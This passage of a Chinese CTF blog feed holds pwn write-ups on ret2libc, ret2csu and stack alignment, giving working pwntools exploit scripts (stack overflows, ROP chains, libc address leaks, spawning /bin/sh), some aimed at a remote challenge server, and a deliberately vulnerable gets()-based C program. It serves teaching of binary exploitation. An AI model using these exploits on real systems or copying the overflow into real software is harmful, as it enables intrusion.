+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203738980.png" alt="image-20220617203738980" style="zoom:80%;" />
+
+<p>在plt表中可以看到调用了system函数(在初始页面按ctrl+s选择plt表跳转)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204005123.png" alt="image-20220617204005123" style="zoom:80%;" />
+
+<p>在查看字符串的时候(shift+f12)，发现字符串&#x2F;bin&#x2F;sh</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204301525.png" alt="image-20220617204301525" style="zoom:80%;" />
+
+<p>现在整理一下可以利用的东西：可以造成溢出的gets函数、系统调用函数system以及字符串&#x2F;bin&#x2F;sh</p>
+<p>除了可以通过ida直接查看字符串的地址，还可以通过ROPgadget</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617205228929.png" alt="image-20220617205228929" style="zoom:80%;" />
+
+
+
+<p>计算s和返回地址的偏移(方法和前面一样)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204730342.png" alt="image-20220617204730342" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp            0xffffcf10       </span><br><span class="line">ebp            0xffffcf98</span><br><span class="line"></span><br><span class="line">s:esp+0x1c=0xffffcf2c</span><br><span class="line">s相对于ebp的偏移：offset=ebp-s=0x6c</span><br><span class="line">s相对于返回地址的偏移：0x6c+4</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>攻击思路</strong></p>
+<p>利用gets函数的栈溢出修改返回地址并使之执行system(“&#x2F;bin&#x2F;sh”)，拿到shell</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)									<span class="comment">#需要填充的垃圾数据</span></span><br><span class="line">bin_sh=<span class="number">0x08048720</span>									<span class="comment">#先前查询的地址</span></span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]						<span class="comment">#可以使用pwntools库中的函数直接查找，也可以像下面这样把ida中找到的直接写出来</span></span><br><span class="line"><span class="comment">#system=0x08048460</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(system_plt)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(bin_sh)	<span class="comment">#构造payload，中间加了b&#x27;bbbb&#x27;是因为在调用函数的时候，同时需要一个对应的返回地址，这里的b&#x27;bbbb&#x27;作为虚假的地址，因为此时已经拿到了shell</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210035884.png" alt="image-20220617210035884" style="zoom:80%;" />
+
+
+
+<h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><p><strong>保护检查</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210220822.png" alt="image-20220617210220822" style="zoom:80%;" />
+
+<p>和例1一样，32位，开启NX保护</p>
+<p>ida打开看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210500398.png" alt="image-20220617210500398" style="zoom:80%;" />
+
+<p>可以造成栈溢出的gets函数</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617212503114.png" alt="image-20220617212503114" style="zoom:80%;" />
+
+<p>查看字符串(shift+f12)，和第一题相比，可以看到没有了字符串&#x2F;bin&#x2F;sh</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210556495.png" alt="image-20220617210556495" style="zoom:80%;" />
+
+<p>在plt表中可以找到system函数</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211320710.png" alt="image-20220617211320710" style="zoom:80%;" />
+
+<p>在bss段可以找到一个连续的空间，并且动调发现bss段可执行</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211915506.png" alt="image-20220617211915506" style="zoom:80%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211848614.png" alt="image-20220617211848614" style="zoom:80%;" />
+
+<p>计算s和返回地址的偏移</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; info reg</span><br><span class="line">eax            0xffffcf2c          -12500</span><br><span class="line">ecx            0xffffffff          -1</span><br><span class="line">edx            0x13                19</span><br><span class="line">ebx            0x0                 0</span><br><span class="line">esp            0xffffcf10          0xffffcf10</span><br><span class="line">ebp            0xffffcf98          0xffffcf98</span><br><span class="line">esi            0xf7fb2000          -134537216</span><br><span class="line">edi            0xf7fb2000          -134537216</span><br><span class="line">eip            0x80486ba           0x80486ba &lt;main+114&gt;</span><br><span class="line">eflags         0x286               [ PF SF IF ]</span><br><span class="line">cs             0x23                35</span><br><span class="line">ss             0x2b                43</span><br><span class="line">ds             0x2b                43</span><br><span class="line">es             0x2b                43</span><br><span class="line">fs             0x0                 0</span><br><span class="line">gs             0x63                99</span><br><span class="line"></span><br><span class="line">s相对于返回地址的偏移:ebp-(esp+0x1c)+4=0x6c+4</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击思路</strong></p>
+<p>和例1很像，不过缺少字符串&#x2F;bin&#x2F;sh，故可以调用gets函数把字符串&#x2F;bin&#x2F;sh写道bss段上，然后修改返回地址执行system(“&#x2F;bin&#x2F;sh”)</p>
+<p>buf2的地址</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617214054803.png" alt="image-20220617214054803" style="zoom:80%;" />
+
+<p>pop_ebx</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617214223568.png" alt="image-20220617214223568" style="zoom:80%;" />
+
+
+
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)							</span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span>						</span><br><span class="line">pop_ebx=<span class="number">0x0804843d</span></span><br><span class="line">gets_plt=elf.plt[<span class="string">&#x27;gets&#x27;</span>]					<span class="comment">#可以这样直接调用函数，也可以在ida中查</span></span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]				<span class="comment">#同上</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(gets_plt)+p32(pop_ebx)+p32(buf2_addr)+p32(system_plt)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(buf2_addr)								<span class="comment">#这里的pop主要是为了返回用的进而执行system函数</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>关于payloa的构造，wiki上面没有详细说明，为了方便理解，画了一张流程图</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/ret2libc2_01.png" alt="ret2libc2_01" style="zoom:80%;" />
+
+<p>我先开始也看不太明白，请教了高师傅后才理解的，后来高师傅还给我推荐了一个构造payload的方法</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span> + p32(gets_plt) + p32(sys_plt) + p32(buf2)+p32(buf2)</span><br></pre></td></tr></table></figure>
+
+<p>这个在栈上的分布如下图所示</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617224122737.png" alt="image-20220617224122737" style="zoom:80%;" />
+
+<p>拿到shell</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617221719649.png" alt="image-20220617221719649" style="zoom:80%;" />
+
+
+
+<h2 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h2><p><strong>保护检查</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102115483.png" alt="image-20220618102115483" style="zoom:80%;" />
+
+<p>32位，开启NX保护</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102235365.png" alt="image-20220618102235365" style="zoom:80%;" />
+
+<p>ida打开看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102436248.png" alt="image-20220618102436248" style="zoom:80%;" />
+
+<p>发现危险函数gets函数</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102526005.png" alt="image-20220618102526005" style="zoom:80%;" />
+
+<p>计算s和返回地址的偏移(方法和之前一样)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; info reg</span><br><span class="line">eax            0xffffcf2c          -12500</span><br><span class="line">ecx            0xffffffff          -1</span><br><span class="line">edx            0x12                18</span><br><span class="line">ebx            0x0                 0</span><br><span class="line">esp            0xffffcf10          0xffffcf10</span><br><span class="line">ebp            0xffffcf98          0xffffcf98</span><br><span class="line">esi            0xf7fb2000          -134537216</span><br><span class="line">edi            0xf7fb2000          -134537216</span><br><span class="line">eip            0x804868a           0x804868a &lt;main+114&gt;</span><br><span class="line">eflags         0x286               [ PF SF IF ]</span><br><span class="line">cs             0x23                35</span><br><span class="line">ss             0x2b                43</span><br><span class="line">ds             0x2b                43</span><br><span class="line">es             0x2b                43</span><br><span class="line">fs             0x0                 0</span><br><span class="line">gs             0x63                99</span><br><span class="line"></span><br><span class="line">s相对于返回地址的偏移:offset=ebp-(esp+0x1c)+4=0x6c+4</span><br></pre></td></tr></table></figure>
+
+<p>程序中可以利用的最明显的就是gets函数的溢出。</p>
+<p><strong>攻击思路</strong></p>
+<p>利用gets函数的溢出泄露出libc版本，进而获取到system地址和&#x2F;bin&#x2F;sh地址，再次执行程序出发栈溢出执行system(“&#x2F;bin&#x2F;sh”)</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;101.35.231.134&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./ret2libc3&#x27;)							#我得本地打不出来，应该和Ubuntu版本有关</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]							<span class="comment">#利用puts函数打印出需要打印的函数的got地址</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]							<span class="comment">#随便选取一个libc库中调用的函数即可，我这里选的是puts的	</span></span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]								<span class="comment">#main函数地址</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(puts_plt)+p32(main)+p32(puts_got)	<span class="comment">#构造payload，这里修改返回调用为puts(puts_got)，puts函数的返回地址为主函数，方便泄露完成后构造shellc获取shell</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])			<span class="comment">#一般got地址是以\xf7开头，也可以像网上那样写，如下</span></span><br><span class="line"><span class="comment">#puts_addr=u32(sh.recv()[0:4])</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr---&gt;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_addr)))		<span class="comment">#打印出来看看</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)					<span class="comment">#利用库查找出libc</span></span><br><span class="line">base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">104</span>+p32(system)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>当使用LibcSearcher查询不到时候(好像是版本的问题打不出来)，可以到网上去在线查询，输入相关的函数的地址(后3位即可)，在线查询网：<a href="https://publicki.top/libc/">https://publicki.top/libc/</a> 或者 <a href="https://libc.rip/">https://libc.rip/</a></p>
+<p>本地没pwn掉应该是因为我用的是Ubuntu20的版本问题</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618125557365.png" alt="image-20220618125557365" style="zoom:80%;" />
+
+<p>但是远程可以打通的</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618125708159.png" alt="image-20220618125708159" style="zoom:80%;" />
+
+
+
+<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>借鉴的博客：<a href="https://blog.csdn.net/AcSuccess/article/details/104448463">https://blog.csdn.net/AcSuccess/article/details/104448463</a></p>
+<p>检查保护</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618202733545.png" alt="image-20220618202733545" style="zoom:80%;" />
+
+<p>64位，开启了NX保护，即堆栈段不可执行</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618202819738.png" alt="image-20220618202819738" style="zoom:80%;" />
+
+<p>ida打开看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618210224594.png" alt="image-20220618210224594" style="zoom:80%;" />
+
+<p>调用的函数</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618210302293.png" alt="image-20220618210302293" style="zoom:80%;" />
+
+<p>可以看到read函数存在栈溢出，因为buf的字长是128，而读入的数据长度是0x200。</p>
+<p>程序中没有system函数的调用，也没有字符串&#x2F;bin&#x2F;sh，故两个都需要自己去构造</p>
+<p><strong>攻击思路</strong></p>
+<p>1、利用栈溢出执行 libc_csu_gadgets 获取 read 函数地址，并使得程序重新执行 main 函数</p>
+<p>2、根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址</p>
+<p>3、再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 ‘&#x2F;bin&#x2F;sh’ 地址，并使得程序重新执行 main 函数。</p>
+<p>4、再次利用栈溢出执行 libc_csu_gadgets 执行 execve(‘&#x2F;bin&#x2F;sh’) 获取 shell。</p>
+<p>这题ctf-wiki讲的不是很详细，我上网找了找相关的题解，除了借鉴的博客，<a href="https://wiki.wgpsec.org/knowledge/ctf/ret2csu.html">狼组安全的文库</a>对这个题型进行了详细的讲解</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;101.35.231.134&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./level5&#x27;)							#我的本地没有打出来，应该是环境的问题</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">128</span>+<span class="number">8</span></span><br><span class="line"></span><br><span class="line">first_csu=<span class="number">0x400606</span></span><br><span class="line">second_csu=<span class="number">0x4005f0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret_csu</span>(<span class="params">r12,r13,r14,r15,last</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">    payload+=p64(first_csu)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    payload+=p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload+=p64(second_csu)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(last)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">start_addr=<span class="number">0x0000000000400460</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">payload=ret_csu(write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,start_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr--&gt;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_addr)))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss_addr=<span class="number">0x601028</span></span><br><span class="line"></span><br><span class="line">payload=ret_csu(read_got,<span class="number">0</span>,bss_addr,<span class="number">18</span>,start_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Hello, World\n&#x27;</span>,payload)</span><br><span class="line">io.sendline(p64(system)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=ret_csu(bss_addr,bss_addr+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,start_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Hello, World\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220619213844860.png" alt="image-20220619213844860" style="zoom:80%;" />
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>栈对齐</title>
+    <url>/2026/06/21/pwn/%E6%A0%88%E5%AF%B9%E9%BD%90/</url>
+    <content><![CDATA[<h1 id="栈对齐"><a href="#栈对齐" class="headerlink" title="栈对齐"></a>栈对齐</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太菜了QWQ，困惑了很久(主要是在脚本中不知道该怎么进行gdb调试)，今天下午研究了一下，造成最后攻击失败的结果应该是<code>movaps</code>指令搞的鬼，经过测试Ubuntu20里有这个问题，Ubuntu16没有。<code>movaps</code>指令要求其目的操作数必须是16的倍数，也就是说其操作数的数值的16进制数的<strong>最后一位</strong>必须为0，这里看一个例子更容易理解§(<em>￣▽￣</em>)§</p>
+<span id="more"></span>
+
+<h2 id="环境、源码编译"><a href="#环境、源码编译" class="headerlink" title="环境、源码编译"></a>环境、源码编译</h2><p><strong>Ubuntu20.04</strong></p>
+<blockquote>
+<p>gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0</p>
+<p>ldd (Ubuntu GLIBC 2.31-0ubuntu9.9) 2.31</p>
+<p>python3编写exp.py 使用pwntools库</p>
+<p>tmux</p>
+<p>zsh(oh-my-zsh)</p>
+<p>pwndbg、pwngdb</p>
+<p>……</p>
+</blockquote>
+<p>附:在终端下使用的是环境是tmux，直接在terminal输入tmux即可进入，想要使鼠标上下滑动查看和选择区间可以在主目录下的<code>.tmux.conf</code>(没有就新建一个)文件里添加<code>set -g mouse on</code></p>
+<p><strong>源码</strong></p>
+<p>test.c</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">heiheihei</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Congratulations on getting the shell&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Author: vi0let ----a rookie in the team&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;You little smart guy, not here, still have to look for oh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_0111101</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> s[<span class="number">120</span>];</span><br><span class="line">	gets(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	init();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello,welcome to the world of pwn ヾ(≧▽≦*)o\n&quot;</span>);</span><br><span class="line">	sub_0111101();</span><br><span class="line">	<span class="comment">// heiheihei();</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc -g -z execstack -fno-stack-protector -no-pie -z lazy test.c -o test</span></span><br></pre></td></tr></table></figure>
+
+<p>最后一行就是编译命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -g -z execstack -fno-stack-protector -no-pie -z lazy test.c -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<p>附:想要偷懒也可以，我把编译好的文件和相关的文件存入了这里:<a href="https://github.com/lucky-xiaobai/research_pwn/tree/main/stack/Stack%20alignment">https://github.com/lucky-xiaobai/research_pwn/tree/main/stack/Stack%20alignment</a></p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>检查保护(其实编译的时候就已经限制了相关的保护)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508202924562.png" alt="image-20230508202924562" style="zoom:80%;" />
+
+<p>64位，没有开启保护</p>
+<p>扔进ida分析</p>
+<p><strong>main</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508203401793.png" alt="image-20230508203401793" style="zoom:80%;" />
+
+<p><strong>sub_0111111101</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508203428000.png" alt="image-20230508203428000" style="zoom:80%;" />
+
+<p><strong>heiheihei</strong>(后门函数)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508203536895.png" alt="image-20230508203536895" style="zoom:80%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508203622054.png" alt="image-20230508203622054" style="zoom:80%;" />
+
+<p>得到后门函数的地址<code>0x0000000000401196</code></p>
+<p>分析结束，其实是一个很简单的<code>ret2text</code>类型的程序，由于栈上可执行也可以直接填充<code>shellcode</code>，这里就选择前者的方法，修改到后门函数执行就可以了</p>
+<p>再找一个<code>ret</code>用来为后面的栈对齐做准备</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508204353165.png" alt="image-20230508204353165" style="zoom:80%;" />
+
+<p>这里就选最后一个了:<code>ret=0x000000000040101a</code></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>先写一个未栈对齐的exp</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]			<span class="comment"># use tmux</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)	<span class="comment"># related information and set log_level</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=remote(&#x27;127.0.0.1&#x27;,9999)</span></span><br><span class="line">io=process(<span class="string">&#x27;./test&#x27;</span>)								<span class="comment"># 本地测试</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)									<span class="comment"># 填充垃圾数据，加8是为了覆盖leave和ret</span></span><br><span class="line">shellc=asm(shellcraft.sh())							<span class="comment"># 这里是利用pwntools库生成64位的shellcode，这次没用到，可以注释掉</span></span><br><span class="line">backdoor=<span class="number">0x0000000000401196</span>							<span class="comment"># 后门函数的地址</span></span><br><span class="line">main= elf.sym[<span class="string">&#x27;main&#x27;</span>]								<span class="comment"># main函数的地址，也可以在ida中查找直接填写</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span>								<span class="comment"># ROPgadget查找</span></span><br><span class="line"></span><br><span class="line">log.info(shellc)									<span class="comment"># 打印出库生成的shellc看一下</span></span><br><span class="line"></span><br><span class="line">payload=junk+p64(backdoor)+<span class="string">b&#x27;deadbeef&#x27;</span>	<span class="comment"># Stack alignment	# 构造payload</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b main&#x27;</span>)								<span class="comment"># 使用gdb追踪调试</span></span><br><span class="line"></span><br><span class="line">pause()												<span class="comment"># 在发送payload前暂停一下，方便查看调试信息</span></span><br><span class="line">io.sendline(payload)								<span class="comment"># 发送</span></span><br><span class="line"></span><br><span class="line">io.interactive()									<span class="comment"># 和终端进行交互</span></span><br></pre></td></tr></table></figure>
+
+<p>可以先把调试的语句注释掉看一下最终是否能成功</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508205403824.png" alt="image-20230508205403824" style="zoom:80%;" />
+
+<p>可以看到结果是失败的，把注释掉的调试语句取消掉注释。</p>
+<p>运行调试查看一下</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508205004970.png" alt="image-20230508205004970" style="zoom:80%;" />
+
